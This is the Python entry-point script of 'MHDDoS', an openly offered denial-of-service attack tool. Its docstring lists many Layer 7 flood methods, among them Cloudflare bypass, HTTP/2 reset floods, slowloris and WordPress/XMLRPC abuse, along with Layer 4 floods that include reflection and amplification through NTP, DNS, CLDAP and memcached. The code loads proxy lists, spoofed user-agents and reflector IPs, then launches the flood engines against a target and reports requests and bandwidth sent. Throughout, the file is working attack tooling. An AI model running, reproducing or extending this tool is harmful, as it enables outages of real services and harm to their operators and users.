#!/usr/bin/env python3
"""
MHDDoS — unified entry point.
Usage:
  python main.py <method> <target> [options]

Layer7:
  GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH|CFB|BYPASS|OVH|STRESS|DYN|SLOW|
  SLOWLORIS|NULL|COOKIE|PPS|EVEN|GSB|DGB|AVB|CFBUAM|APACHE|XMLRPC|
  XMLRPC_MULTI|BOT|BOMB|DOWNLOADER|KILLER|TOR|RHEX|STOMP|WORDPRESS|
  H2|H2_RST|H2_PRIORITY|H2_CONT|COOKIE_HARVEST|WS|GQL|RANGE_CRASH|
  STEALTH|MIX|RAPID|QUIC|TLS_FLOOD|IMPERSONATE|MEGA|ASYNC

Layer4:
  TCP|UDP|SYN|ICMP|VSE|MINECRAFT|MCBOT|CONNECTION|CPS|FIVEM|
  FIVEM-TOKEN|TS3|MCPE|OVH-UDP|MEM|NTP|DNS|ARD|CLDAP|CHAR|RDP

Options:
  --threads <n>      Thread count (default: 1)
  --duration <s>     Attack duration in seconds (default: 60)
  --rpc <n>          Requests per connection (default: 10)
  --proxy <file>     Proxy list file
  --proxy-type <t>   Proxy type: http/socks4/socks5 (default: http)
  --ua <file>        User-Agent file (default: built-in list)
  --referer <file>   Referer file
  --reflector <file> Reflector IP list for amplification
  --debug            Enable debug logging
"""

import argparse
import logging
import sys
import threading
from pathlib import Path
from time import sleep, time
from yarl import URL

from core.utils import (
    Counter,
    Tools,
    logger,
    REQUESTS_SENT,
    BYTES_SEND,
    Methods,
)
from core.proxy import load_proxies
from core.engine import Layer4, HttpFlood


def parse_args():
    p = argparse.ArgumentParser(description="MHDDoS Attack Tool", add_help=False)
    p.add_argument("method", help="Attack method")
    p.add_argument("target", help="Target URL or host:port")
    p.add_argument("--threads", type=int, default=1)
    p.add_argument("--duration", type=int, default=60)
    p.add_argument("--rpc", type=int, default=10)
    p.add_argument("--proxy", type=str, default="")
    p.add_argument("--proxy-type", type=str, default="http")
    p.add_argument("--ua", type=str, default="")
    p.add_argument("--referer", type=str, default="")
    p.add_argument("--reflector", type=str, default="")
    p.add_argument("--debug", action="store_true")
    p.add_argument("--help", action="help", help="Show this help")
    return p.parse_args()


def main():
    args = parse_args()
    logger.setLevel(logging.DEBUG if args.debug else logging.INFO)
    method = args.method.upper()

    # Determine Layer4 vs Layer7
    layer4_methods = set(Methods.LAYER4_METHODS)
    is_layer4 = method in layer4_methods

    # Resolve reflectors
    reflectors = []
    if args.reflector:
        path = Path(args.reflector)
        if path.exists():
            with open(path) as f:
                reflectors = [l.strip() for l in f if l.strip()]

    # Resolve proxies
    proxies = load_proxies(args.proxy) if args.proxy else []

    # Resolve useragents
    useragents = []
    if args.ua and Path(args.ua).exists():
        with open(args.ua) as f:
            useragents = [l.strip() for l in f if l.strip()]
    if not useragents:
        useragents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        ]

    if is_layer4:
        # target = host:port
        if ":" not in args.target:
            logger.error("Layer4 needs host:port format")
            sys.exit(1)
        host, port_str = args.target.rsplit(":", 1)
        try:
            port = int(port_str)
        except ValueError:
            logger.error("Invalid port")
            sys.exit(1)
        engine = Layer4(
            target=(host, port),
            threads=args.threads,
            duration=args.duration,
            method=method,
            proxies=proxies,
            rpc=args.rpc,
            reflectors=reflectors,
        )
        engine.run()
    else:
        if "://" not in args.target:
            args.target = f"https://{args.target}"
        url = URL(args.target)
        engine = HttpFlood(
            target=url,
            method=method,
            threads=args.threads,
            duration=args.duration,
            rpc=args.rpc,
            proxies=proxies,
            useragents=useragents,
        )
        engine.run()

    # Print stats
    elapsed = args.duration
    total_req = int(REQUESTS_SENT)
    total_bytes = int(BYTES_SEND)
    rps = total_req / max(elapsed, 1)
    mbps = (total_bytes * 8) / max(elapsed, 1) / 1_000_000
    logger.info(
        f"[DONE] Sent {total_req} requests, "
        f"{total_bytes // 1024}KB ({rps:.0f} req/s, {mbps:.1f} Mbps)"
    )


if __name__ == "__main__":
    main()
